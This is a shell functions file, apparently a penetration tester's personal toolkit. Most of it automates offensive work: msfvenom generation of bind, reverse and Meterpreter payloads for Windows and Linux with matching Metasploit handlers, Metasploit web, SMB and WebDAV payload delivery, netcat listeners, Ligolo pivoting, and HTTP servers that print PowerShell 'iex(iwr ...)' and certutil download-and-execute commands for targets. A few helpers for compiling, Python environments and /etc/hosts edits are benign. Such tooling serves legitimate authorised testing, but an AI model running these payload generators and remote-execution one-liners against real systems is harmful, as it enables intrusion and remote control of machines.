# TTY upgrade
tty(){
    echo "script -qc /bin/bash /dev/null \n python3 -c 'import pty; pty.spawn(\"/bin/bash\")' \n CTRL+Z -> stty raw -echo; fg -> reset -> export TERM=xterm \n xterm for teminal type"
}

#gcc compilation
gcc_comp() {
    gcc -Wall -I/home/damuna/gsl/include -c $1
}

gcc_ex(){
    gcc -L/home/damuna/gsl/lib $1 -O1 -g -lgmp -lm -lgsl -lgslcblas
}

# Netcat Listener
listen(){
    sudo rlwrap -car nc -lvnp $1
}

# Meterpreter Listener
msflisten(){
    if [[ -z $1 ]]; then
        echo -e "\n[-] USAGE: \"msflisten [PORT]\"\n"
        exit 0
    fi
    chnic
    while true; do
        read -r os\?"[+] SELECT OS (win32 / win64 / lin32 / lin64): "
        if [[ $os == "win32" ]]; then
            echo -e "\n[+] OPENING MSF LISTENER ON \"$ip:$1\"\n"
            msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $inter; set LPORT $1; run;"
            break
        elif [[ $os == "win64" ]]; then
            echo -e "\n[+] OPENING MSF LISTENER ON \"$ip:$1\"\n"
            msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $inter; set LPORT $1; run;"
            break
        elif [[ $os == "lin32" ]]; then
            echo -e "\n[+] OPENING MSF LISTENER ON \"$ip:$1\"\n"
            msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST $inter; set LPORT $1; run;"
            break
        elif [[ $os == "lin64" ]]; then
            echo -e "\n[+] OPENING MSF LISTENER ON \"$ip:$1\"\n"
            msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST $inter; set LPORT $1; run;"
            break
        else
            echo -e "\n[-] INVALID OS CHOICE, PLEASE TRY AGAIN\n"
        fi
    done
}

smtpserv(){
    chnic
    echo -e "OPENING SMTP 'DebuggingServer' AT $ip:25\n"
    python2 -m smtpd -n -c DebuggingServer $ip:25
}

httpsserv() {
    chnic
    local port="$1"
    local cert_file="/tmp/cert.pem"
    local key_file="/tmp/key.pem"
    
    if [ -z "$port" ]; then
        echo "Usage: httpsserv <port>"
        return 1
    fi

    if [ ! -f "$cert_file" ] || [ ! -f "$key_file" ]; then
        echo "Generating self-signed certificate..."
        openssl req -x509 -newkey rsa:2048 -keyout "$key_file" -out "$cert_file" \
            -days 365 -nodes -subj '/CN=localhost' >/dev/null 2>&1
    fi

    echo "Certificate saved in: $cert_file"
    openssl x509 -in "$cert_file" -noout -text | head -n 11
    echo ""

    echo "Starting HTTPS server on https://$ip:$port"
    echo "Press Ctrl+C to stop the server"
    echo "----------------------------------------"
    
    sudo python3 -c "
import http.server
import ssl
import os

port = $port
cert_file = '$cert_file'
key_file = '$key_file'

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile=cert_file, keyfile=key_file)

httpd = http.server.HTTPServer(('"$ip"', port), http.server.SimpleHTTPRequestHandler)
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

print(f'HTTPS server running on https://$ip:{port}')
print('Serving current directory:', http.server.os.getcwd())
print('----------------------------------------')
httpd.serve_forever()
"
}

httpserv(){ 
    if [[ -z $1 ]]; then
        echo -e "\n[-] USAGE: httpserv [PORT]\n"
        exit 0
    fi
    chnic
    echo -e "OPENING HTTP SERVER AT http://$ip:$1\n"
    echo -e "WINDOWS COMMANDS:\n"
    echo -e "- certutil.exe -urlcache -split -f http://$ip:$1/[INPUT] [OUTPUT]'"
    echo -e "- powershell.exe -c iex(iwr -useb -uri http://$ip:$1/FILE.ps1) \n"

    python3 -m http.server $1
}

httpservUP(){
    chnic
    echo "File upload available at /upload"
    echo "curl -X POST https://$ip:443/upload -F 'files=@[FILE]' --insecure"
    
    # Remove old certificates from /tmp
    rm -f /tmp/server.{key,crt,pem}
    
    # Generate new certificates in /tmp
    openssl req -x509 -newkey rsa:2048 -keyout /tmp/server.key -out /tmp/server.crt -days 365 -nodes -subj '/CN=server'
    
    # Combine certificates
    cat /tmp/server.crt /tmp/server.key > /tmp/server.pem
    
    # Create and use ./https directory instead of /tmp/https
    mkdir -p ./https && cd ./https
    
    # Start the upload server with the certificate from /tmp
    uploadserver 443 --server-certificate /tmp/server.pem
}

ftpserv(){
    chnic
    echo -e "OPENING FTP SERVER AT ftp://$ip:2121"
    python3 -m pyftpdlib -p 2121 -w >/dev/null
}

smbserv(){
    chnic
    read -r creds\?"INPUT \"USER:PASS\" CREDENTIALS (BLANK FOR ANONYMOUS): "
    usr=$(echo $creds | cut -d ":" -f1)
    psw=$(echo $creds | cut -d ":" -f2)
    if [[ ! -z $creds ]]; then
        echo -e "\nCONNECT WITH: net use n: \\\\\\$ip\\share /user:$usr $psw \nCOPY FILE: copy n:\\[FILE]\nEXECUTE FILE: n:\[FILE]"
        smbserver.py -ip $ip -user $usr -password $psw -smb2support share $(pwd)
    else
        echo -e "\nCONNECT WITH: copy \\\\\\$ip\\share\\[FILE]\n"
        smbserver.py -ip $ip -smb2support share $(pwd)
    fi
}

webdavserv(){
    chnic
    echo -e "\nOPENING WEBDAV AT http://$ip:8001\n FROM /tmp"
    wsgidav --host=$ip --port=8001 --root=$(pwd) --auth=anonymous
}

# Start Ligolo Proxy
ligstart(){
    chnic
    mkdir -p ./LIGOLO_DATA && cd ./LIGOLO_DATA
    local port="${1:-11601}"

    echo -e "\n[+] COPYING LIGOLO AGENTS IN DATA DIRECTORY\n"
    cp /home/damuna/tools/LIGOLO_AGENTS/agent .
    cp /home/damuna/tools/LIGOLO_AGENTS/agent.exe .

    echo -e "\n[+] OPENING LIGOLO PROXY ON \"$ip:$port\"\n"
    echo -e "\t./agent -connect $ip:$port -ignore-cert\n"
    ligcreate ligolo >/dev/null
    sudo ligolo-proxy -selfcert -nobanner -laddr "$ip:$port"
    cd ..
    ligdel ligolo
    sudo rm -rf ./LIGOLO_DATA
}

ligcreate(){
    usr=$(whoami)
    sudo ip tuntap add user $usr mode tun $1
    sudo ip link set $1 up
}

ligdel(){
    sudo ip link delete $1
}


# Interface Setting
chnic(){
    nic_lst=$(ifconfig | awk -F" " '{print $1}' | grep : | tr -d ':' | tr '\n' ', ')
    read -r nic\?"SELECT NIC (${nic_lst%?}): "
    export inter=$nic
    export ip=$(ifconfig $inter 2>/dev/null | awk -F" " '{print $2}' | sed -n '2 p')
}

# python virtual environment
pyenv() {
    echo -e "\nSPAWNING VIRTUAL PYTHON3 ENVIRONMENT\n"
    python3 -m venv venv
    source venv/bin/activate

    if [[ -f ./requirements.txt ]]; then
        python3 -m pip install -r requirements.txt
    fi

    echo -n "Do you want to create a shell alias for this project? (y/N): "
    read CREATE_ALIAS

    if [[ "$CREATE_ALIAS" =~ ^[Yy]$ ]]; then
        PY_BIN="$(which python3)"
        PROJECT_DIR="$(pwd)"
        TOOL_NAME="$(basename "$PROJECT_DIR")"

        echo -n "Enter script filename to run [default: main.py]: "
        read SCRIPT_NAME
        SCRIPT_NAME="${SCRIPT_NAME:-main.py}"
        
        while [[ ! -f "./$SCRIPT_NAME" ]]; do
            echo "Error: '$SCRIPT_NAME' not found in current folder."
            echo -n "Enter script filename to run: "
            read SCRIPT_NAME
        done

        echo "alias ${TOOL_NAME}='${PY_BIN} ${PROJECT_DIR}/${SCRIPT_NAME}'" >> ~/.zshrc
        echo "✅ Alias '${TOOL_NAME}' added. Run 'source ~/.zshrc' to use it."
    else
        echo "Skipping alias creation."
    fi
}

pyenv2() {
    echo -e "\nSPAWNING VIRTUAL PYTHON2.7 ENVIRONMENT\n"

    virtualenv -p python2.7 venv
    source venv/bin/activate

    if [[ -f ./requirements.txt ]]; then
        python -m pip install -r requirements.txt
    fi

    echo -n "Do you want to create a shell alias for this project? (y/N): "
    read CREATE_ALIAS

    if [[ "$CREATE_ALIAS" =~ ^[Yy]$ ]]; then
        PY_BIN="$(which python)" 
        PROJECT_DIR="$(pwd)"
        TOOL_NAME="$(basename "$PROJECT_DIR")"

        echo -n "Enter script filename to run [default: main.py]: "
        read SCRIPT_NAME
        SCRIPT_NAME="${SCRIPT_NAME:-main.py}"

        echo "alias ${TOOL_NAME}='${PY_BIN} ${PROJECT_DIR}/${SCRIPT_NAME}'" >> ~/.zshrc
        echo "✅ Alias '${TOOL_NAME}' added. Run 'source ~/.zshrc' to use it."
    else
        echo "Skipping alias creation."
    fi
}


# Meterpreter Delivery Windows Generator
meterup(){
    echo -e "\n[+] SELECT LISTENER INTERFACE\n"
    chnic
    nicip=$(ifconfig $nic | grep inet | awk '{print $2}' | head -n 1)   
    read -r lport\?"[+] INPUT LISTENER PORT: "
    read -r srvport\?"[+] INPUT HTTP DELIVERY PORT: "
    read -r os\?"[+] SELECT OS (win32 / win64 / lin32 / lin64): "
    if [[ $os =~ "win" ]]; then
        read -r mtd\?"[+] SELECT DELIVERY METHOD (smb, http, webdav): "
    fi

    pl=""
    if [[ $os =~ "lin" ]]; then
        if [[ $os == "lin32" ]]; then
            pl="/x86/"
        fi
        if [[ $os == "lin64" ]]; then
            pl="/x64/"
        fi
        sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set payload linux${pl}meterpreter/reverse_tcp; set target 7; set LPORT $lport; set LHOST $nic; set SRVHOST $nic; set srvport $srvport; run"
    fi

    if [[ $os =~ "win" ]]; then
        if [[ $os == "win32" ]]; then
            pl="/"
        fi

        if [[ $os == "win64" ]]; then
            pl="/x64/"
        fi

        if [[ $mtd == "smb" ]]; then
            sudo msfconsole -q -x "use exploit/windows/smb/smb_delivery; set payload windows${pl}meterpreter/reverse_tcp; set LPORT $lport; set LHOST $nic; set SRVHOST $nic; set srvport $srvport; run"
        fi

        if [[ $mtd == "http" ]]; then
            sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set payload windows${pl}meterpreter/reverse_tcp; set target 2; set LPORT $lport; set LHOST $nic; set SRVHOST $nic; set srvport $srvport; run;"
        fi

        if [[ $mtd == "webdav" ]]; then
            sudo msfconsole -q -x "use exploit/windows/misc/webdav_delivery; set payload windows${pl}meterpreter/reverse_tcp; set LPORT $lport; set LHOST $nic; set SRVHOST $nic; set srvport $srvport; run"
        fi
    fi
}

# MSF Listener / Binder Generator
metash(){
    echo -e "\n[+] SELECT LISTENER INTERFACE\n"
    chnic
    read -r os\?"[+] SELECT OS (win32 / win64 / lin32 / lin64): "
    if [[ $os =~ ^lin* ]]; then
        read -r form\?"[+] SELECT FORMAT (elf, elf-so): "
    fi
    if [[ $os =~ ^win* ]]; then
        read -r form\?"[+] SELECT FORMAT (exe, ps1, msi, dll, asp, aspx, hta, vba, vbs): "
    fi

    ext_form=$form
    if [[ $form == "ps1" ]]; then
        form="psh"
        ext_form="ps1"
    fi

    read -r type\?"[+] SELECT STAGING: (staged / stageless): "
    if [[ $type == "stageless" ]]; then
        read -r lis\?"[+] SELECT CONNECTION (bind / reverse): "
    fi

    if [[ $type == "staged" ]]; then
        read -r lis\?"[+] SELECT CONNECTION (bind / reverse / meterpreter): "
    fi

    read -r lhost\?"[+] INPUT PAYLOAD IP/NIC: "
    read -r port\?"[+] INPUT PAYLOAD PORT: "

    if [[ $os =~ ^lin* ]]; then
        if [[ $os == "lin32" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi

                if [[ $lis == "meterpreter" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi

            if [[ $type == "stageless" ]]; then 
                if [[ $lis == "bind" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x86/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
        fi
        if [[ $os == "lin64" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi

                if [[ $lis == "meterpreter" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
            if [[ $type == "stageless" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p linux/x64/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
        fi
    fi

    if [[ $os =~ ^win* ]]; then
        if [[ $os == "win64" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi

                if [[ $lis == "meterpreter" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
            if [[ $type == "stageless" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom --smallest -p windows/x64/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
        fi
        if [[ $os == "win32" ]]; then
            if [[ $type == "staged" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x86/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi

                if [[ $lis == "meterpreter" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom -a x86 -p windows/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
            if [[ $type == "stageless" ]]; then
                if [[ $lis == "bind" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    read -r target\?"[+] INPUT TARGET IP AFTER SHELL EXECUTION: "
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                fi

                if [[ $lis == "reverse" ]]; then
                    echo -e "\n[+] GENERATING SHELL\n"
                    msfvenom -a x86 -p windows/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form

                    echo -e "\n[+] OPENING HANDLER\n"
                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                fi
            fi
        fi
    fi
}

# Exploit Research Function
ssp(){
    fileout=$(echo "$1" | tr -d ' ' | tr -d '/')
    echo -e "\n[+] SEARCHING CVE POCs FOR \"$1\"\n"
    vulnx search $1 --limit 100 --silent "poc_count:>0" --json | jq '.results[] | {
    CVE_ID: .cve_id,
    Vulnerability_Type: .vulnerability_type,
    Description: .description,
    POC_URLs: [.pocs[].url],
}' | tee exploits_$(echo $1 | tr " " "_").txt
}

# Add/Extend Host Mappings of /etc/hosts
addhost() {
    if [[ -z $1 ]]; then
        echo "Usage: addhost ip hostname"
        return 1
    fi
    ip="$1"
    hostname="$2"
    if grep -q "^$ip" /etc/hosts; then
      sudo sed -i "/^$ip/s/$/ $hostname/" /etc/hosts
      echo "[+] Appended $hostname to existing entry for $ip in /etc/hosts"
    else
      echo "$ip $hostname" | sudo tee -a /etc/hosts > /dev/null
      echo "[+] Added new entry: $ip $hostname to /etc/hosts"
    fi

    grep "^$ip" /etc/hosts
}
